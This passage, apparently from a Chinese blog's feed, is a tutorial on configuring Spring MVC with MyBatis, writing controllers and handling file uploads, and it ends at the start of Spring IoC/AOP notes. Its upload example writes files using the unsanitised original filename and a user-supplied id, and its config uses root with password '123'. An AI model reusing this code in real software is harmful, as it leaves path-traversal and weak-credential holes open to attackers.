设置数据库信息--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"com.mysql.cj.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">"jdbc:mysql://127.0.0.1:3306/cvs_db?useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf8<span class="symbol">&amp;amp;</span>useSSL=false<span class="symbol">&amp;amp;</span>serverTimezone=UTC<span class="symbol">&amp;amp;</span>zeroDateTimeBehavior=convertToNull"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--        name是在地址栏的访问路径名 class是访问的JAVA地址--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        &lt;bean name="/hello" class="com.bdqn.controller.HelloController"&gt;&lt;/bean&gt;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    开启注解   tip:开始MVC注解扫描--&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    扫描注解   tip:扫描bdqn整个目录下的注解--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.bdqn"</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        视图解析器   用来方法返回跳转页面 扫描目录下的文件 自动匹配后缀 渲染视图跳转--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--                前缀扫描目录--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/jsp/"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--                文件后缀名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">&lt;!--    配置 SqlSessionFactoryBean  tip:Mybatis框架 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        引用数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        引用MyBatis配置文件中的配置--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        扫描目录下所有的mybatis框架的xml--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapperLocations"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>classpath:com/bdqn/dao/*.xml<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"typeAliasesPackage"</span> <span class="attr">value</span>=<span class="string">"com.bdqn.pojo"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置DAO--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basePackage"</span> <span class="attr">value</span>=<span class="string">"com.bdqn.dao"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h5 id="web-xml配置"><a href="#web-xml配置" class="headerlink" title="web.xml配置"></a>web.xml配置</h5><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--        前端控制器--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--        所有的请求都会经过mvc 所以用 / --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/WEB-INF/jsp/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--设置编码集--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h5 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h5><p>将所需lib包配置在WEB-INF里 tip:配套文件的SSM整合导包</p><h5 id="目录设置"><a href="#目录设置" class="headerlink" title="目录设置"></a>目录设置</h5><p>在src文件夹里 按照上方的自动扫描路径 应该创建 com.dbqn 然后配置四个文件夹 分别是 controller（前端控制器） 、dao（实现类）、pojo（实体类）、service（服务器端）。</p><p>在<code>src</code>文件夹里，你可以按照如下方式组织项目结构：</p><ol><li><code>com.dbqn</code>（或你的包名）是根包。你可以选择一个适合你的应用的包名。</li><li>在根包下创建子包：<ul><li><code>controller</code>：用于存放前端控制器类，这些类处理HTTP请求和响应，通常使用Spring MVC。</li><li><code>dao</code>：用于存放数据访问对象（DAO）的实现类，这些类通常与数据库交互，可以使用MyBatis等持久层框架。</li><li><code>pojo</code>：用于存放实体类，这些类表示应用程序中的数据对象。</li><li><code>service</code>：用于存放服务器端的业务逻辑类，通常用于处理业务规则和数据操作，可以使用Spring服务层组件。</li></ul></li></ol><p>项目结构示例：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">src</span><br><span class="line">└── com</span><br><span class="line">    └── dbqn</span><br><span class="line">        ├── controller</span><br><span class="line">        ├── dao</span><br><span class="line">        ├── pojo</span><br><span class="line">        └── service</span><br></pre></td></tr></tbody></table></figure><p>这个项目结构可以根据你的具体需求和喜好进行调整，但按照这种约定可以使项目更易于管理和维护，也符合通用的Java项目组织标准。</p><p>然后在web包里 按照上方配置文件 需要 jsp文件夹和已经导入好包的lib文件夹,框架会自动扫描jsp文件夹里的文件，然后自动渲染展示。这也代表所有的jsp页面都将写在这里，所以需要把自动生成的index页面也移动到jsp文件夹里，这样在启动的时候会找不到启动开始的页面，所以在配置文件web.xml里面需要添加一段更改开始启动页面的地址</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/WEB-INF/jsp/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>最上方的配置文件已经添加完成直接copy就可以</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h5 id="前端控制器-Controller-的注解配置"><a href="#前端控制器-Controller-的注解配置" class="headerlink" title="前端控制器(Controller)的注解配置"></a>前端控制器(Controller)的注解配置</h5><p>在创建完所有的包洛后需要进行一些简单的注释配置 在前端控制器(Controller)里需要添加注解**@Controller**并且在里面使用映射器@Resource 接受服务器端返回的方法</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> {</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在前端控制器（Controller）中，通常使用Spring框架，你需要进行以下配置：</p><ol><li>添加 <code>@Controller</code> 注解：使用 <code>@Controller</code> 注解来标识一个类为控制器。这表明该类将处理HTTP请求。</li><li>使用 <code>@Autowired</code> 或 <code>@Resource</code>：使用这些注解来注入服务（Service）或其他组件到控制器中，而不是“接受服务器端返回的方法”。你通常将业务逻辑放在服务（Service）类中。</li></ol><p>修正后的描述如下：</p><p>在前端控制器（Controller）里，需要添加 <code>@Controller</code> 注解并注入服务，例如：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> {</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> MyService myService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义处理HTTP请求的方法</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这个示例中，<code>MyController</code> 类被标识为控制器，并使用 <code>@Autowired</code> 注解注入了 <code>MyService</code> 服务。服务类中包含了服务器端的业务逻辑。请注意，通常不使用 <code>@Resource</code> 注解来注入服务，而是使用 <code>@Autowired</code> 或其他Spring注解。</p><h5 id="服务器端实现类-ServiceImpl-的注解配置"><a href="#服务器端实现类-ServiceImpl-的注解配置" class="headerlink" title="服务器端实现类(ServiceImpl)的注解配置"></a>服务器端实现类(ServiceImpl)的注解配置</h5><p>在服务端里需要添加@Service注解并注入服务@Resource</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> {</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Dao类编写"><a href="#Dao类编写" class="headerlink" title="Dao类编写"></a>Dao类编写</h5><p>在dao包中，需要创建一个接口类和对应的XML文件。接口类应该定义与数据访问相关的方法。一旦接口方法定义完成，你可以使用MyBatis框架来生成XML文件，并在XML文件中编写SQL语句以便执行数据库操作并返回相应的数据。</p><h5 id="pojo类编写"><a href="#pojo类编写" class="headerlink" title="pojo类编写"></a>pojo类编写</h5><p>在POJO（Plain Old Java Object）中创建一个Java文件以表示实体类。实体类的<strong>属性</strong>和<strong>构造函数</strong>应根据你要实现的功能进行编写。通常包括以下内容：</p><ul><li>属性：定义类的属性，这些属性对应于数据库表中的字段。</li><li>无参构造函数：提供一个无参构造函数，用于创建对象实例。</li><li>有参构造函数：提供有参构造函数，以便可以根据需要初始化对象。</li><li>Getter和Setter方法：为每个属性提供Getter（获取属性值）和Setter（设置属性值）方法，以便可以访问和修改对象的属性。</li></ul><h5 id="编写逻辑功能"><a href="#编写逻辑功能" class="headerlink" title="编写逻辑功能"></a>编写逻辑功能</h5><p>到此所有配置全部完成最后你需要根据你的业务需求去编写相关逻辑，使用SSM框架减轻了很多重复代码的编写，只需要编写核心逻辑代码就可以运行页面，使用MVC系统让代码间的耦合度降低更适合抽象的编写代码，比如你要编写一个查询User的功能那么你的编写逻辑和顺序就是</p><p>建立一个User实体类在pojo,然后创建User前端控制器，创建UserDao编写查询方法然后生成XML文件，编写Service服务类返回查询结果，在前端控制器调用Service的查询方法并且返回结果使用List<user>返回结果输出到Jsp页面，在Jsp页面遍历数据展示渲染</user></p><h3 id="Spring-MVC框架文件上传"><a href="#Spring-MVC框架文件上传" class="headerlink" title="Spring MVC框架文件上传"></a>Spring MVC框架文件上传</h3><p>Spring MVC框架下文件上传的步骤如下：</p><ol><li>前端使用form表单，设置<strong>enctype=”multipart/form-data”<strong>属性。这个</strong>属性</strong>是<strong>必须</strong>的，以二进制流的方式来处理表单数据，这种编码方式会把文件域指定文件的内容也封装到请求参数中，不会对字符编码。</li><li>在Spring MVC的配置文件web.xml中，配置文件上传的路径。</li><li>在Spring MVC中创建一个Controller，里面定义一个处理文件上传的方法。</li><li>处理文件上传的方法会获取到前端传过来的文件，然后进行相应的处理。</li></ol><p>这就是基本的步骤，当然在具体实现的时候可能需要考虑其他的一些细节，比如文件的存储位置、文件的安全性等问题。</p><h5 id="导包-1"><a href="#导包-1" class="headerlink" title="导包"></a>导包</h5><p>要使用MVC框架文件上传，首先需要导包</p><p>commons-fileupload-1.2.2.jar</p><p>commons-io-2.4.jar</p><p>commons-lang-2.6.jar</p><p>可以在配套文件/SSM整合导包/文件上传的包找到相应的文件</p><h5 id="applicationContext-xml配置"><a href="#applicationContext-xml配置" class="headerlink" title="applicationContext.xml配置"></a>applicationContext.xml配置</h5><p>在使用前还需要配置相关的参数</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    配置MutipartResolver解析器,用于上传文件，使用Spring的CommonsMultipartResolver--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"multipartResolver"</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.multipart.commons.CommonsMultipartResolver"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxUploadSize"</span> <span class="attr">value</span>=<span class="string">"500000"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultEncoding"</span> <span class="attr">value</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>里面的两个参数分别是maxUploadSize 值是上传的文件大小封顶 defaultEncoding 值是文件编码</p><h5 id="jsp页面传值和前端控制器（Controller）接收"><a href="#jsp页面传值和前端控制器（Controller）接收" class="headerlink" title="jsp页面传值和前端控制器（Controller）接收"></a>jsp页面传值和前端控制器（Controller）接收</h5><p>在jsp页面使用form表单提交文件和其他信息在控制器进行接收，这是jsp页面实例</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;p&gt;上传头像&lt;/p&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">"upload"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"attachs"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"id"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Update&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure><p>tip:注意，一定要在form里有**enctype=”multipart/form-data”**否则就无法传值到控制器里，因为没有流向</p><p>在前端控制器可以这样接收</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping("/uploaddate")</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleFileUpload</span><span class="params">(<span class="meta">@RequestParam("attachs")</span> MultipartFile file, <span class="meta">@RequestParam("id")</span> String id)</span> {</span><br><span class="line">        <span class="comment">// 处理上传的文件</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (!file.isEmpty()) {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                <span class="comment">// 获取上传的文件名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">                System.out.println(<span class="string">"上传的文件名称:"</span> + fileName);</span><br><span class="line">                <span class="comment">// 创建目标文件路径</span></span><br><span class="line">                filePath = <span class="string">"path/to/save/"</span> + id;</span><br><span class="line">                <span class="comment">// 创建目标文件夹（如果不存在）</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(filePath).mkdirs();</span><br><span class="line">                <span class="comment">// 保存上传的文件到目标路径</span></span><br><span class="line">                file.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(filePath + File.separator + fileName));</span><br><span class="line">                <span class="comment">// 处理文件上传成功的逻辑</span></span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">                <span class="comment">// 文件上传失败的逻辑</span></span><br><span class="line">                System.out.println(<span class="string">"上传失败"</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="comment">// 返回错误信息给用户</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 文件为空</span></span><br><span class="line">            System.out.println(<span class="string">"文件空"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 文件上传成功</span></span><br><span class="line">        userService.Addimage(Integer.parseInt(id),filePath);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>重点在于，使用**@RequestParam(“attachs”) MultipartFile file<strong>这个注解方法参数就可以获取到前端页面传的文件，然后使用调用相应的</strong>get方法<strong>和</strong>其他方法<strong>就可以实现</strong>保存<strong>或者</strong>读取文件信息**的操作</p><p>以下的图表展示了<strong>MultipartFile file</strong>的所有<strong>方法</strong>调用还有<strong>解释</strong>：</p><table><thead><tr><th align="center">方法</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">getInputStream()</td><td align="center">该方法返回一个InputStream，用于读取上传的文件数据。这是由于MultipartFile继承自InputStreamSource接口，封装了getInputStream方法。通过这个方法，可以将文件转换为输入流形式进行传输。使用此方法时，可能会抛出IOException异常。</td></tr><tr><td align="center">getName()</td><td align="center">此方法获取上传文件的参数名称。在SpringBoot后台中，这个名称是通过@Param注解定义的。</td></tr><tr><td align="center">getOriginalFileName()</td><td align="center">此方法返回上传文件的完整名称，包括文件名和扩展名。</td></tr><tr><td align="center">getContentType()</td><td align="center">此方法获取上传文件的类型，注意是文件的类型，而不是文件的扩展名。</td></tr><tr><td align="center">getSize()</td><td align="center">此方法返回上传文件的大小，单位是字节。</td></tr><tr><td align="center">isEmpty()</td><td align="center">此方法判断上传的文件是否为空，如果为空则表示没有上传任何文件。</td></tr><tr><td align="center">transferTo(File dest)</td><td align="center">此方法将接收到的文件传输到给定的目标路径。使用此方法时，可能会抛出IOException、IllegalStateException异常。</td></tr></tbody></table><h5 id="文件保存位置"><a href="#文件保存位置" class="headerlink" title="文件保存位置"></a>文件保存位置</h5><p>文件保存的位置在创建的<strong>tomcat构建文件</strong>里 默认是<strong>bin</strong>文件下面。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring学习笔记</title>
      <link href="/NANABLOG/2022/09/03/Spring%E6%A1%86%E6%9E%B6/"/>
      <url>/NANABLOG/2022/09/03/Spring%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring框架简介"><a href="#Spring框架简介" class="headerlink" title="Spring框架简介"></a>Spring框架简介</h2><p>Spring框架是一个开源的Java应用程序框架，主要用于构建企业级应用程序。它提供了全面的基础设施支持，包括两个核心功能：控制反转（IoC）和面向切面编程（AOP）。</p><ol><li><strong>控制反转（IoC）</strong>：<ul><li><strong>定义</strong>：IoC是一种设计模式，它将应用程序中对象的创建、依赖关系的管理交给了容器，而不是由开发者手动管理。</li><li><strong>Spring实现</strong>：Spring的IoC容器负责创建和管理应用程序组件，将Bean的依赖关系自动注入，开发者只需要声明依赖关系，而不需要手动实例化对象。</li><li><strong>优点</strong>：简化了代码，减少了耦合度，提高了灵活性和可维护性。</li></ul></li><li><strong>面向切面编程（AOP）</strong>：<ul><li><strong>定义</strong>：AOP是一种编程范式，允许开发者在程序执行的特定点（称为连接点）上插入代码，从而实现与核心业务逻辑分离的关注点（如日志、事务管理等）。</li><li><strong>Spring实现</strong>：Spring提供了AOP模块，可以通过定义切面、连接点、通知等来实现AOP编程，使得关注点的代码可以独立于业务逻辑进行管理和维护。</li><li><strong>优点</strong>：提高了代码的模块化程度，降低了代码重复，增强了可维护性和扩展性。</li></ul></li></ol><p>Spring框架的这两个核心功能使得开发者可以更专注于业务逻辑的实现，而无需过多关心对象的创建、依赖关系和横切关注点的处理。这样可以大大提高开发效率，减少了重复性的工作，同时也使得代码更加清晰、可维护和可扩展。</p><h2 id="Spring框架概览"><a href="#Spring框架概览" class="headerlink" title="Spring框架概览"></a>Spring框架概览</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><strong>Spring框架</strong></td><td>一个开源的Java应用程序框架，用于构建企业级应用程序。它提供了全面的基础设施支持，包括IoC和AOP。</td></tr><tr><td><strong>IoC容器</strong></td><td>Inversion of Control（控制反转）容器，负责管理应用程序组件的生命周期和依赖关系。</td></tr><tr><td><strong>AOP</strong></td><td>Aspect-Oriented Programming（面向切面编程），用于将横切关注点（如日志记录、安全性）与应用程序的核心业务逻辑分离开来。</td></tr></tbody></table><h2 id="Spring-IoC（控制反转）"><a href="#Spring-IoC（控制反转）" class="headerlink" title="Spring IoC（控制反转）"></a>Spring IoC（控制反转）</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><strong>IoC容器</strong></td><td>Spring的IoC容器负责创建和管理应用程序组件。常见的IoC容器包括<code>BeanFactory</code>和<code>ApplicationContext</code>。</td></tr><tr><td><strong>Bean</strong></td><td>在Spring中，Bean是被IoC容器管理的Java对象。可以使用<code>@Component</code>注解或XML配置来定义Bean。</td></tr><tr><td><strong>依赖注入（DI）</strong></td><td>通过DI，Spring容器将Bean的依赖关系自动注入到Bean中，而不是由Bean自己创建依赖对象。</td></tr><tr><td><strong>@Autowired注解</strong></td><td>用于自动装配Bean之间的依赖关系。可以用于构造函数、属性或方法上。</td></tr><tr><td><strong>@ComponentScan注解</strong></td><td>用于启用自动扫描并注册标记为<code>@Component</code>的Bean。</td></tr><tr><td><strong>@Configuration注解</strong></td><td>用于定义Java类作为配置类，声明Bean定义和Bean之间的依赖关系。</td></tr><tr><td><strong>@Bean注解</strong></td><td>在配置类中使用，用于定义Bean的创建和初始化方法。</td></tr></tbody></table><h2 id="Spring-AOP（面向切面编程）"><a href="#Spring-AOP（面向切面编程）" class="headerlink" title="Spring AOP（面向切面编程）"></a>Spring AOP（面向切面编程）</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><strong>切面（Aspect）</strong></td><td>用于定义横切关注点，如日志记录、性能监控。</td></tr><tr><td><strong>连接点（Join Point）</strong></td><td>在应用程序执行过程中，可以插入切面的点。例如，方法调用、异常抛出等。</td></tr><tr><td><strong>通知（Advice）</strong></td><td>切面在连接点上执行的代码块，包括<code>@Before</code>、<code>@After</code>、<code>@Around</code>等。</td></tr><tr><td><strong>切点（Pointcut）</strong></td><td>定义一组连接点，切面会在这些连接点上执行通知。</td></tr><tr><td><strong>@Aspect注解</strong></td><td>用于定义切面，包括切点和通知。</td></tr><tr><td><strong>@Before注解</strong></td><td>在连接点之前执行通知的注解。</td></tr><tr><td><strong>@After注解</strong></td><td>在连接点之后执行通知的注解。</td></tr><tr><td><strong>@Around注解</strong></td><td>包围连接点执行的通知，可以控制连接点的执行流程。</td></tr></tbody></table><p>以上是Spring框架的主要概念和常用注解，它们可以帮助您实现IoC和AOP，以构建更可维护和可扩展的Java应用程序。</p><h1 id="IoC详细步骤"><a href="#IoC详细步骤" class="headerlink" title="IoC详细步骤"></a>IoC详细步骤</h1><h2 id="0-导入Spring坐标"><a href="#0-导入Spring坐标" class="headerlink" title="0.导入Spring坐标"></a>0.导入Spring坐标</h2><p>也就是在xml里导入Spring位置，否则无法建立Spring文件</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span 